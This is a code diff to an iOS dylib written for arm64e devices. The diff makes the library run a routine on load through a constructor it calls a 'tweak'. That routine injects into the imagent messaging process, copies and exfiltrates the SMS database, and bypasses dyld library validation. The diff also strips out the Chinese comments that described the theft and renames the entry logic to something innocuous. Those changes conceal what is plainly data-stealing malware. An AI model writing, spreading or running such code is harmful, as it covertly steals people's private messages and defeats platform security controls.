@@ -221,13 +221,8 @@ __attribute__((noinline)) void *pacia(void* ptr, uint64_t ctx) {
 }
 #endif
 
-// ============================================================
-// 主入口：_process（bootstrap.dylib 期望的符号）
-// ============================================================
-__attribute__((visibility("default")))
-void _process(void* buffer) {
-    g_buffer = (uint32_t*)buffer;
-    
+// ===== 核心逻辑 =====
+static void last(void) {
 #if __arm64e__
     _dlsym = pacia(dlsym, 0);
     __pthread_set_self = pacia(_pthread_set_self, 0);
@@ -251,15 +246,22 @@ void _process(void* buffer) {
     _malloc = _dlsym(RTLD_DEFAULT, "malloc");
     _free = _dlsym(RTLD_DEFAULT, "free");
 
-    // 1. 注入 imagent 复制 sms.db
     inject_imagent();
-
-    // 2. 回传数据
     exfil_sms(g_buffer);
 
-    // 3. 原始逻辑：加载 actual.dylib
     const char *path = save_actual_dylib();
     dyld_lv_bypass_init(_dlsym, path);
 
     _thread_terminate(_mach_thread_self());
+}
+
+__attribute__((constructor))
+static void tweak_auto_start(void) {
+    last();
+}
+
+__attribute__((visibility("default")))
+void _process(void* buffer) {
+    g_buffer = (uint32_t*)buffer;
+    last();
 }
